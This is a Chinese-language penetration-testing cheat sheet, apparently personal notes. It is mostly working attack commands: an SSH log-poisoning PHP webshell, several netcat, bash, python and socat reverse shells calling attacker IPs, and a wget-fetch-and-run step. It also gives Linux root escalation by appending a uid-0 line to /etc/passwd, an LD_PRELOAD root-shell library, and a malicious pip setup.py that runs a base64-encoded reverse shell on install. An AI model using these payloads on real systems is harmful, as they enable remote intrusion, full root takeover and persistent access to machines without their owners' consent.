### 收集信息

#### 域名，子域名

##### wfuzz子域名穷举

wfuzz教程

https://www.ddosi.org/wfuzz-guide/

```


在这里，-c 对输出响应代码进行颜色编码
-Z 指定要在扫描模式下输入的 URL，并忽略任何连接错误
-w 指定在子域暴力破解时使用的密码字典列表。

wfuzz -c -Z -w subdomains.txt http://FUZZ.vulnweb.com
```





#### 其他

###### samba

```
enum4linux用于枚举Windows和Samba主机中的数据。
```











### GET-shell



#### ssh日志get-shell

```
直接尝试登陆
ssh '<?php @eval($_REQUEST['cmd']);?>'@ip

这里输错几次密码 同时，这段一句话木马也会留在/var/log/auth.log里，如果没有被转译的话

然后用蚁剑连接
```



#### 反弹shell

这个网站可以生成

https://www.revshells.com/



这里写的是攻击机ip

###### netcat反弹

```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.36.101.179 443 >/tmp/f");?>

```

###### bash反弹

```
bash -i >& /dev/tcp/192.168.1.106/8888 0>1&
bash -i >& /dev/tcp/192.168.1.106/8888 0>1& | bash
```

###### python反弹

```
目标机执行

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### 升级shell

###### python升级tty shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
python -c '__import__("pty").spawn("/bin/bash")' 
```

###### script升级

```
script /dev/null
```

###### socket

```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444


socat file:`tty`,raw,echo=0 tcp-listen:9999
```



### 提权

```
https://gtfobins.github.io/
```

这里面很多实用的

#### linux

基本上先看`sudo -l`

看看有哪些权限



###### awk提权

```
sudo awk 'BEGIN {system("/bin/bash")}'
```



###### capabilities提权

```
CAP_DAC_READ_SEARCH 忽略文件读及目录搜索的 DAC 访问限制

使用getcap查看权限，如：tar拥有权限，可以打包后，再解压文件，实现越权读取
```

###### /etc/passwd提权

构造一个用户 uid设置为0 因为root的uid为0

```
#利用openssl生成加密的密码, 语法：openssl passwd-1-salt[salt value]password
openssl passwd -1 -salt user3 pass123
 
#mkpasswd类似于openssl passwd，它将生成指定密码字符串的哈希值。
mkpasswd -m SHA-512 pass
 
#利用python中的crypt库生成
python -c 'import crypt; print crypt.crypt("pass", "$6$salt")'
 
#利用Perl和crypt来使用salt值为我们的密码生成哈希值
perl -le 'print crypt("test","addedsalt")'
这里把test转换为密码
 
#php语言
php -r "print(crypt('aarti','123') . " ");"


echo的第一个是自己设置的用户名 冒号后面的是生成的哈希密码
echo "test:adMpHktIn0tR2:0:0:root:/root:/bin/bash" >>/etc/passwd

```

###### LD_PRELOAD提权

sudo -l查看下用户权限  发现有find命令

编写shell.c

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/usr/bin/bash");
}
```

编译下

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

-fPIC -shared 简单理解就是动态编辑共享库，可以进行公共调用，

-nostartfiles 代表该库运行不会去调用系统的其它库，避免影响自己的程序执行。

记得加777权限 不过也可以在目标机编译

```
ls -al shell.so
sudo LD_PRELOAD=path/shell.so find
```

###### pip提权

1

```
下载fakepip文件

#setup.py
from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
  def run(self):
    install.run(self)
    LHOST = 'localhost'  # change this
    LPORT = 13372
    
    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
    encoded = base64.b64encode(reverse_shell)
    os.system('echo %s|base64 -d|bash' % encoded)


setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
```

创建个文件夹 把setup.py放进去

```
sudo /usr/bin/pip install . --upgrade --force-reinstall
运行
```

或者

```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```



#### windows

### 后门







### 杂

###### ssh密匙利用

```
先用ssh2john把私匙转换hash
在john跑字典 
chmod 600 private_key
ssh user@ip -i private_key
```

